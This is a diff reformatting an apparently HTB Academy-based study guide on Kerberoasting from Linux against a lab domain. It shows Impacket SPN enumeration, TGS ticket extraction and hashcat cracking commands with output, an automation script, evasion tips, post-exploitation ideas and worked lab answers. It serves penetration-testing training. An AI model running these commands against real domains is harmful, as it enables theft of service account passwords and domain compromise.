@@ -1,4 +1,4 @@
-# Kerberoasting - from Linux
+# 🎫 Kerberoasting from Linux
 
 ## 📋 Overview
 
@@ -7,56 +7,62 @@ Kerberoasting is a powerful lateral movement and privilege escalation technique 
 ## 🎯 Attack Theory and Context
 
 ### 🔍 **What are Service Principal Names (SPNs)?**
-- **SPNs** are unique identifiers that Kerberos uses to map service instances to service accounts
-- **Service Accounts** run services to overcome network authentication limitations of built-in accounts
-- **Domain Context** allows any domain user to request tickets for any SPN in the same domain
-- **Cross-Forest** attacks are possible if authentication is permitted across trust boundaries
+
+* **SPNs** are unique identifiers that Kerberos uses to map service instances to service accounts
+* **Service Accounts** run services to overcome network authentication limitations of built-in accounts
+* **Domain Context** allows any domain user to request tickets for any SPN in the same domain
+* **Cross-Forest** attacks are possible if authentication is permitted across trust boundaries
 
 ### 🎪 **Why Kerberoasting is Effective**
-- **High Privileges**: Service accounts often have local admin or Domain Admin rights
-- **Weak Passwords**: Services frequently use weak or default passwords for convenience
-- **Multiple Systems**: Service accounts may have admin rights across multiple servers
-- **Group Membership**: Often added to privileged groups like Domain Admins (directly or nested)
-- **Business Critical**: Service accounts rarely have password expiration policies
+
+* **High Privileges**: Service accounts often have local admin or Domain Admin rights
+* **Weak Passwords**: Services frequently use weak or default passwords for convenience
+* **Multiple Systems**: Service accounts may have admin rights across multiple servers
+* **Group Membership**: Often added to privileged groups like Domain Admins (directly or nested)
+* **Business Critical**: Service accounts rarely have password expiration policies
 
 ### ⚡ **Attack Prerequisites**
-- **Domain User Credentials**: Cleartext password, NTLM hash, or Kerberos ticket
-- **Domain Context**: Shell in domain user context or SYSTEM level access
-- **Domain Controller Access**: Ability to query DC for SPN information
-- **Network Connectivity**: Access to domain network and DC (port 88, 389, 445)
 
----
+* **Domain User Credentials**: Cleartext password, NTLM hash, or Kerberos ticket
+* **Domain Context**: Shell in domain user context or SYSTEM level access
+* **Domain Controller Access**: Ability to query DC for SPN information
+* **Network Connectivity**: Access to domain network and DC (port 88, 389, 445)
+
+***
 
 ## 🔧 Attack Scenarios and Methods
 
 ### 📊 **Common Attack Vectors**
 
-| **Scenario** | **Requirements** | **Method** |
-|--------------|------------------|------------|
-| **Non-domain Linux** | Valid domain credentials | Impacket GetUserSPNs.py |
-| **Domain-joined Linux** | Root access, keytab file | Kerberos authentication |
+| **Scenario**              | **Requirements**           | **Method**                        |
+| ------------------------- | -------------------------- | --------------------------------- |
+| **Non-domain Linux**      | Valid domain credentials   | Impacket GetUserSPNs.py           |
+| **Domain-joined Linux**   | Root access, keytab file   | Kerberos authentication           |
 | **Domain-joined Windows** | Domain user authentication | PowerView, Rubeus, built-in tools |
-| **SYSTEM on Windows** | Local SYSTEM privileges | Multiple tool options |
-| **runas /netonly** | Non-domain Windows host | Credential impersonation |
+| **SYSTEM on Windows**     | Local SYSTEM privileges    | Multiple tool options             |
+| **runas /netonly**        | Non-domain Windows host    | Credential impersonation          |
 
 ### 🛠️ **Tool Options for Linux Attacks**
-- **Impacket GetUserSPNs.py**: Primary Linux tool for SPN enumeration and ticket extraction
-- **Kerberos Utils**: Native Linux Kerberos tools (kinit, klist, etc.)
-- **Custom Scripts**: Python/Bash scripts leveraging LDAP and Kerberos libraries
-- **CrackMapExec**: Integrated Kerberoasting functionality
-- **Rubeus**: Windows tool that can be run through Wine
+
+* **Impacket GetUserSPNs.py**: Primary Linux tool for SPN enumeration and ticket extraction
+* **Kerberos Utils**: Native Linux Kerberos tools (kinit, klist, etc.)
+* **Custom Scripts**: Python/Bash scripts leveraging LDAP and Kerberos libraries
+* **CrackMapExec**: Integrated Kerberoasting functionality
+* **Rubeus**: Windows tool that can be run through Wine
 
 ### ⚠️ **Attack Effectiveness Considerations**
-- **Strong Passwords**: Modern environments may use complex service account passwords
-- **Managed Service Accounts**: Group Managed Service Accounts (GMSA) resist this attack
-- **Detection**: Security teams may monitor for unusual TGS ticket requests
-- **Cracking Time**: TGS tickets take longer to crack than NTLM hashes
 
----
+* **Strong Passwords**: Modern environments may use complex service account passwords
+* **Managed Service Accounts**: Group Managed Service Accounts (GMSA) resist this attack
+* **Detection**: Security teams may monitor for unusual TGS ticket requests
+* **Cracking Time**: TGS tickets take longer to crack than NTLM hashes
+
+***
 
 ## 🔧 Impacket Installation and Setup
 
 ### 📦 **Installing Impacket Toolkit**
+
 ```bash
 # Clone the official repository
 git clone https://github.com/SecureAuthCorp/impacket.git
@@ -75,6 +81,7 @@ GetUserSPNs.py -h
 ```
 
 **Installation Output:**
+
 ```bash
 $ sudo python3 -m pip install .
 
@@ -89,12 +96,14 @@ Successfully installed impacket-0.9.25.dev1+20220208.122405.769c3196
 ```
 
 ### 🔍 **GetUserSPNs.py Help and Options**
+
 ```bash
 # Display help menu
 GetUserSPNs.py -h
 ```
 
 **Key Command Options:**
+
 ```bash
 GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-usersfile USERSFILE] 
                [-request] [-request-user username] [-save] [-outputfile OUTPUTFILE] 
@@ -110,11 +119,12 @@ GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN] [-usersfile USERSFILE]
 # target               domain/username[:password]
 ```
 
----
+***
 
 ## 🎯 Complete Kerberoasting Workflow
 
 ### 🔍 **Phase 1: SPN Discovery and Enumeration**
+
 ```bash
 # Basic SPN enumeration (requires password prompt)
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
@@ -130,6 +140,7 @@ GetUserSPNs.py -target-domain LOGISTICS.INLANEFREIGHT.LOCAL -dc-ip 172.16.5.240 
 ```
 
 **Example SPN Enumeration Output:**
+
 ```bash
 $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 
@@ -149,6 +160,7 @@ adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLeg
 ### 🎫 **Phase 2: TGS Ticket Extraction**
 
 #### **Extract All TGS Tickets**
+
 ```bash
 # Request all available TGS tickets
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
@@ -158,6 +170,7 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request -outputfile
 ```
 
 #### **Target Specific High-Value Accounts**
+
 ```bash
 # Request ticket for specific user (Domain Admin)
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
@@ -170,6 +183,7 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user BACKUP
 ```
 
 **Example TGS Ticket Output:**
+
 ```bash
 $ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 
@@ -183,6 +197,7 @@ $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b3
 ### 🔐 **Phase 3: Offline Password Cracking**
 
 #### **Hashcat Cracking Process**
+
 ```bash
 # Hashcat mode 13100 for Kerberos 5 TGS-REP
 hashcat -m 13100 sqldev_tgs.txt /usr/share/wordlists/rockyou.txt
@@ -201,6 +216,7 @@ hashcat -m 13100 sqldev_tgs.txt --show
 ```
 
 **Example Successful Crack:**
+
 ```bash
 $ hashcat -m 13100 sqldev_tgs.txt /usr/share/wordlists/rockyou.txt
 
@@ -231,6 +247,7 @@ Stopped: Tue Feb 15 17:45:41 2022
 ```
 
 ### ✅ **Phase 4: Credential Validation**
+
 ```bash
 # Test credentials with CrackMapExec
 crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'
@@ -249,6 +266,7 @@ crackmapexec mssql 172.16.5.5 -u sqldev -p 'database!'
 ```
 
 **Example Validation Output:**
+
 ```bash
 $ crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'
 
@@ -256,7 +274,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
 ```
 
----
+***
 
 ## 🎯 HTB Academy Lab Solutions
 
@@ -265,6 +283,7 @@ SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqld
 #### 🎫 **Question 1: "Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer."**
 
 **Solution Process:**
+
 ```bash
 # Step 1: Enumerate SPNs to find SAPService account
 GetUserSPNs.py -dc-ip [DC_IP] INLANEFREIGHT.LOCAL/forend
@@ -287,6 +306,7 @@ hashcat -m 13100 sapservice_tgs.txt sap_passwords.txt
 ```
 
 **Complete Lab Workflow:**
+
 ```bash
 # Connect to HTB VPN and SSH to target
 ssh htb-student@[TARGET_IP]
@@ -310,6 +330,7 @@ hashcat -m 13100 sapservice.txt /usr/share/wordlists/rockyou.txt -O
 #### 👥 **Question 2: "What powerful local group on the Domain Controller is the SAPService user a member of?"**
 
 **Solution Process:**
+
 ```bash
 # Method 1: Check group membership during SPN enumeration
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 | grep -i SAPService
@@ -328,20 +349,22 @@ ldapsearch -H ldap://172.16.5.5 -D "INLANEFREIGHT\forend" -w Klmcargo2 -b "DC=IN
 ```
 
 **Common Powerful Local Groups:**
-- **Backup Operators**: Can backup and restore files (bypass NTFS permissions)
-- **Server Operators**: Can manage domain controllers
-- **Account Operators**: Can modify user accounts
-- **Print Operators**: Can manage printers and print queues
-- **Administrators**: Full administrative rights
-- **Remote Desktop Users**: Can log in via RDP
+
+* **Backup Operators**: Can backup and restore files (bypass NTFS permissions)
+* **Server Operators**: Can manage domain controllers
+* **Account Operators**: Can modify user accounts
+* **Print Operators**: Can manage printers and print queues
+* **Administrators**: Full administrative rights
+* **Remote Desktop Users**: Can log in via RDP
 
 **Expected Answer Format:** `[Group Name]` (e.g., `Backup Operators`)
 
----
+***
 
 ## 🔧 Advanced Kerberoasting Techniques
 
 ### 🎯 **Targeted SPN Enumeration**
+
 ```bash
 # Filter by service type
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend | grep -i "MSSQL\|HTTP\|SAP\|Oracle"
@@ -357,6 +380,7 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend > spn_enumeration.tx
 ```
 
 ### 🔐 **Optimized Cracking Strategies**
+
 ```bash
 # Use multiple wordlists in order of likelihood
 hashcat -m 13100 tickets.txt /usr/share/wordlists/probable-v2-top12000.txt
@@ -375,6 +399,7 @@ hashcat -m 13100 tickets.txt -a 1 common_words.txt common_numbers.txt
 ```
 
 ### 🔍 **Cross-Domain Kerberoasting**
+
 ```bash
 # Target child domains
 GetUserSPNs.py -target-domain LOGISTICS.INLANEFREIGHT.LOCAL -dc-ip 172.16.5.240 INLANEFREIGHT.LOCAL/forend
@@ -387,6 +412,7 @@ GetUserSPNs.py -target-domain CHILD.DOMAIN.COM -dc-ip [CHILD_DC] PARENT.DOMAIN.C
 ```
 
 ### 🔄 **Automation and Scripting**
+
 ```bash
 #!/bin/bash
 # Automated Kerberoasting script
@@ -420,11 +446,12 @@ echo "[+] Cracked passwords:"
 hashcat -m 13100 $OUTPUT_DIR/all_tickets.txt --show --potfile-path $OUTPUT_DIR/cracked.pot
 ```
 
----
+***
 
 ## 🔍 Alternative Tools and Methods
 
 ### 🛠️ **Rubeus via Wine (Linux)**
+
 ```bash
 # Install Wine
 sudo apt install wine
@@ -440,6 +467,7 @@ wine Rubeus.exe kerberoast /domain:INLANEFREIGHT.LOCAL /format:hashcat /outfile:
 ```
 
 ### 🔧 **CrackMapExec Integration**
+
 ```bash
 # Kerberoasting with CrackMapExec
 crackmapexec ldap 172.16.5.5 -u forend -p Klmcargo2 --kerberoasting kerberoast_output.txt
@@ -449,6 +477,7 @@ crackmapexec ldap 172.16.5.5 -u forend -p Klmcargo2 --kerberoasting kerberoast_o
 ```
 
 ### 🐍 **Custom Python Scripts**
+
 ```python
 #!/usr/bin/env python3
 # Custom Kerberoasting script using ldap3 and impacket
@@ -489,11 +518,12 @@ if __name__ == "__main__":
         print("-" * 50)
 ```
 
----
+***
 
 ## ⚡ Quick Reference Commands
 
 ### 🔧 **Essential Kerberoasting Workflow**
+
 ```bash
 # 1. Basic enumeration
 GetUserSPNs.py -dc-ip [DC_IP] [DOMAIN]/[USER]:[PASS]
@@ -512,27 +542,30 @@ crackmapexec smb [DC_IP] -u [CRACKED_USER] -p '[CRACKED_PASS]'
 ```
 
 ### 📊 **Common SPN Patterns**
-| **Service** | **SPN Format** | **Common Ports** |
-|-------------|----------------|------------------|
-| **MSSQL** | `MSSQLSvc/server.domain.com:1433` | 1433, 1434 |
-| **HTTP** | `HTTP/server.domain.com` | 80, 443, 8080 |
-| **LDAP** | `ldap/server.domain.com` | 389, 636, 3268 |
-| **CIFS/SMB** | `cifs/server.domain.com` | 445, 139 |
-| **WinRM** | `WSMAN/server.domain.com` | 5985, 5986 |
-| **Exchange** | `exchangeMDB/server.domain.com` | 135, 993, 995 |
-| **Terminal Services** | `TERMSRV/server.domain.com` | 3389 |
 
----
+| **Service**           | **SPN Format**                    | **Common Ports** |
+| --------------------- | --------------------------------- | ---------------- |
+| **MSSQL**             | `MSSQLSvc/server.domain.com:1433` | 1433, 1434       |
+| **HTTP**              | `HTTP/server.domain.com`          | 80, 443, 8080    |
+| **LDAP**              | `ldap/server.domain.com`          | 389, 636, 3268   |
+| **CIFS/SMB**          | `cifs/server.domain.com`          | 445, 139         |
+| **WinRM**             | `WSMAN/server.domain.com`         | 5985, 5986       |
+| **Exchange**          | `exchangeMDB/server.domain.com`   | 135, 993, 995    |
+| **Terminal Services** | `TERMSRV/server.domain.com`       | 3389             |
+
+***
 
 ## 🔑 Key Takeaways
 
 ### ✅ **Attack Success Factors**
-- **Weak Passwords**: Service accounts with dictionary or predictable passwords
-- **High Privileges**: Accounts with Domain Admin or local admin rights
-- **Multiple SPNs**: Users with several service registrations increase attack surface
-- **Legacy Systems**: Older environments often have weaker service account security
+
+* **Weak Passwords**: Service accounts with dictionary or predictable passwords
+* **High Privileges**: Accounts with Domain Admin or local admin rights
+* **Multiple SPNs**: Users with several service registrations increase attack surface
+* **Legacy Systems**: Older environments often have weaker service account security
 
 ### 🎯 **Target Prioritization**
+
 1. **Domain Admins**: Highest priority - immediate domain compromise
 2. **Service Admins**: Accounts with admin rights on multiple systems
 3. **Database Services**: Often have elevated privileges (MSSQL, Oracle, SAP)
@@ -540,18 +573,20 @@ crackmapexec smb [DC_IP] -u [CRACKED_USER] -p '[CRACKED_PASS]'
 5. **Backup Services**: Often have backup operator rights
 
 ### ⚠️ **Detection and Evasion**
-- **Unusual TGS Requests**: Large numbers of ticket requests may trigger alerts
-- **Service Account Monitoring**: Some orgs monitor service account authentication
-- **Behavioral Analysis**: Rapid successive ticket requests are suspicious
-- **Time-based Attacks**: Spread requests over time to avoid detection
-- **Legitimate SPNs**: Focus on real service accounts rather than user accounts with SPNs
+
+* **Unusual TGS Requests**: Large numbers of ticket requests may trigger alerts
+* **Service Account Monitoring**: Some orgs monitor service account authentication
+* **Behavioral Analysis**: Rapid successive ticket requests are suspicious
+* **Time-based Attacks**: Spread requests over time to avoid detection
+* **Legitimate SPNs**: Focus on real service accounts rather than user accounts with SPNs
 
 ### 🚀 **Post-Exploitation Opportunities**
-- **SQL Server Access**: Use cracked MSSQL service accounts for `xp_cmdshell`
-- **Service Impersonation**: Create service tickets for the compromised SPN
-- **Privilege Escalation**: Use high-privilege service accounts for lateral movement
-- **Persistence**: Service accounts often don't change passwords frequently
 
----
+* **SQL Server Access**: Use cracked MSSQL service accounts for `xp_cmdshell`
+* **Service Impersonation**: Create service tickets for the compromised SPN
+* **Privilege Escalation**: Use high-privilege service accounts for lateral movement
+* **Persistence**: Service accounts often don't change passwords frequently
 
-*Kerberoasting remains one of the most effective Active Directory attack techniques - by targeting the intersection of service requirements and administrative convenience, it often provides a direct path to high-privilege access in enterprise environments.* 
+***
+
+_Kerberoasting remains one of the most effective Active Directory attack techniques - by targeting the intersection of service requirements and administrative convenience, it often provides a direct path to high-privilege access in enterprise environments._
